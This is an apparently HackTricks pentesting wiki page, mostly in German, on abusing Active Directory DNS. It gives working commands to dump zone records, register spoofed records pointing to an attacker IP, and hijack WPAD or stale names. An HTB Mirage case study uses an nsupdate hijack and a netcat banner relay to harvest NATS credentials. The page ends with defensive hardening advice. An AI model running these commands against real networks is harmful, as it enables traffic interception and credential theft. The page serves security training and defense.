# AD DNS-Einträge

{{#include ../../banners/hacktricks-training.md}}

Standardmäßig kann **jeder Benutzer** in Active Directory **alle DNS records enumerieren** in den Domain- oder Forest-DNS-Zonen, ähnlich einem zone transfer (Benutzer können die child objects einer DNS-Zone in einer AD-Umgebung auflisten).

Das Tool [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) ermöglicht **enumeration** und **exporting** von **allen DNS records** in der Zone für recon-Zwecke interner Netzwerke.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) fügt JSON/Greppable (`--json`) Ausgabe, Multi-Threaded DNS-Auflösung und Unterstützung für TLS 1.2/1.3 beim Binden an LDAPS hinzu

Für weitere Informationen siehe [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Erstellen / Ändern von Einträgen (ADIDNS spoofing)

Weil die Gruppe **Authenticated Users** standardmäßig **Create Child** auf der zone DACL hat, kann jedes Domänenkonto (oder Computerkonto) zusätzliche Einträge registrieren. Dies kann für traffic hijacking, NTLM relay coercion oder sogar full domain compromise genutzt werden.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py wird mit Impacket ≥0.12.0 ausgeliefert)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Häufige Angriffsprimitive

1. **Wildcard record** – `*.<zone>` verwandelt den AD DNS-Server in einen unternehmensweiten Responder, ähnlich wie bei LLMNR/NBNS spoofing. Es kann missbraucht werden, um NTLM-Hashes abzufangen oder diese an LDAP/SMB weiterzuleiten. (Erfordert, dass WINS-lookup deaktiviert ist.)
2. **WPAD hijack** – füge `wpad` hinzu (oder einen **NS**-Eintrag, der auf einen Angreifer-Host zeigt, um die Global-Query-Block-List zu umgehen) und leite ausgehende HTTP-Anfragen transparent über einen Proxy, um Anmeldeinformationen zu sammeln. Microsoft hat die wildcard-/DNAME-Bypässe (CVE-2018-8320) gepatcht, aber **NS-records funktionieren weiterhin**.
3. **Stale entry takeover** – beanspruche die IP-Adresse, die zuvor zu einer Workstation gehörte; der zugehörige DNS-Eintrag wird weiterhin aufgelöst, wodurch resource-based constrained delegation oder Shadow-Credentials-Angriffe möglich werden, ohne DNS überhaupt anzufassen.
4. **DHCP → DNS spoofing** – in einer Standard-Windows-DHCP+DNS-Umgebung kann ein nicht authentifizierter Angreifer im gleichen Subnetz durch das Senden gefälschter DHCP-Anfragen, die dynamic DNS updates auslösen, jeden bestehenden A record (einschließlich Domain Controllers) überschreiben (Akamai “DDSpoof”, 2023). Dadurch entsteht ein machine-in-the-middle über Kerberos/LDAP und es kann zur vollständigen Domain-Übernahme kommen.
5. **Certifried (CVE-2022-26923)** – ändere den `dNSHostName` eines Maschinenaccounts, den du kontrollierst, registriere einen passenden A record und fordere dann ein Zertifikat für diesen Namen an, um dich als DC auszugeben. Tools wie **Certipy** oder **BloodyAD** automatisieren den Ablauf vollständig.

---

### Interne Service-Übernahme via veraltete dynamische Einträge (NATS-Fallstudie)

Wenn dynamische Updates für alle authentifizierten Benutzer offenbleiben, kann **ein deregistrierter Dienstname erneut beansprucht und auf Angreiferinfrastruktur umgeleitet werden**. Der Mirage HTB DC zeigte nach DNS scavenging den Hostnamen `nats-svc.mirage.htb` an, sodass jeder Benutzer mit geringen Rechten:

1. **Bestätigen, dass der Eintrag fehlt** und die SOA mit `dig` ermitteln:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Den DNS-Eintrag neu erstellen** auf eine von ihnen kontrollierte externe/VPN-Schnittstelle:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate the plaintext service**. NATS-Clients erwarten, ein `INFO { ... }` Banner zu sehen, bevor sie Anmeldeinformationen senden, daher reicht das Kopieren eines legitimen Banners vom echten Broker aus, um Geheimnisse abzugreifen:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or just sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.

4. **Pivot with the captured creds** – in Mirage the stolen NATS account provided JetStream access, which exposed historic authentication events containing reusable AD usernames/passwords.

This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.

---

## Erkennung & Härtung

* Verweigern Sie **Authenticated Users** das Recht *Create all child objects* auf sensiblen Zonen und delegieren Sie dynamische Updates an ein dediziertes Konto, das von DHCP verwendet wird.
* Wenn dynamische Updates erforderlich sind, setzen Sie die Zone auf **Secure-only** und aktivieren Sie **Name Protection** in DHCP, sodass nur das Besitzer-Computerobjekt seinen eigenen Eintrag überschreiben kann.
* Überwachen Sie DNS-Server-Ereignis-IDs 257/252 (dynamic update), 770 (zone transfer) und LDAP-Schreibvorgänge zu `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Sperren Sie gefährliche Namen (`wpad`, `isatap`, `*`) mit einem bewusst harmlosen Eintrag oder über die Global Query Block List.
* Halten Sie DNS-Server gepatcht – z. B. erreichten RCE-Bugs CVE-2024-26224 und CVE-2024-26231 **CVSS 9.8** und sind remote gegen Domain Controllers ausnutzbar.



## References

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, weiterhin die De-facto-Referenz für wildcard/WPAD-Angriffe)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dez 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
